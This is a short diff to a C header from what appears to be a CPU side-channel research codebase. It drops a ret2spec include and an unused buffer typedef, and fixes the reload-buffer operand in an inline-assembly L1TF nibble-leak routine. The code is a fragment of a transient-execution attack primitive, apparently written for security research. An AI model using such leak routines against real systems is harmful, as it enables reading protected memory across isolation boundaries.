@@ -1,6 +1,5 @@
 #pragma once
 #include "constants.h"
-#include "ret2spec.h"
 #include <stddef.h>
 #include <stdint.h>
 
@@ -16,7 +15,6 @@
 #define AMOUNT_OF_OPTIONS_IN_NIBBLE 16
 #define AMOUNT_OF_NIBBLES_PER_RELOAD 2
 #define AMOUNT_OF_RELOAD_PAGES (AMOUNT_OF_OPTIONS_IN_NIBBLE * AMOUNT_OF_NIBBLES_PER_RELOAD)
-typedef uint8_t bit_reload_buffer[PAGE_SIZE];
 typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD][AMOUNT_OF_OPTIONS_IN_NIBBLE][PAGE_SIZE];
 
 #define AMOUNT_OF_BYTE_OPTIONS 256
@@ -54,7 +52,7 @@ static inline __attribute__((always_inline)) void asm_l1tf_leak_low_nibble(void 
                    "handler%=:"
 
                    ::[leak_addr] "r"(leak_addr),
-                   [nibble] "r"(reload_buffer[1])
+                   [nibble] "r"(reload_buffer[0])
                    : "rax", "r12", "r13", "r14");
 }
 
